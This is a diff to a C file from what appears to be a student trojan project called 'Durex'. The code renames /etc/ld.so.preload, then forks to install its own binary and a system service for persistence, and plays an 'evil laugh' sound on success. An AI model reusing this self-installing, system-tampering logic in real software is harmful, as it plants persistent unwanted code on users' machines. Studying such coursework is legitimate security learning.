@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2019/07/17 12:26:02 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/08/04 04:38:14 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -24,21 +24,20 @@ void				print_usr_name()
 {
 	int				fd;
 
-	write(STDOUT_FILENO, "rduclos\ngbourgeo\n", 18);
+	write(STDOUT_FILENO, DUREX_USERS, sizeof(DUREX_USERS));
 	if (seteuid(geteuid()) != 0)
 		return ;
 	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
 	if (fd < 0) {
-		if (rename("/etc/ld.so.preload", "/etc/mamouth")) {
+		if (rename(DUREX_PRELOAD, "/etc/mamouth")) {
 			if (fork() == 0)
 			{
-				if (!install_binary() /*&& !install_conf()
-				&& !install_init()*/ && !install_service())
+				if (!install_binary() && !install_service())
 					system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
 				exit(0);
 			}
 		} else {
-			rename("/etc/mamouth", "/etc/ld.so.preload");
+			rename("/etc/mamouth", DUREX_PRELOAD);
 		}
 		exit(0);
 	}
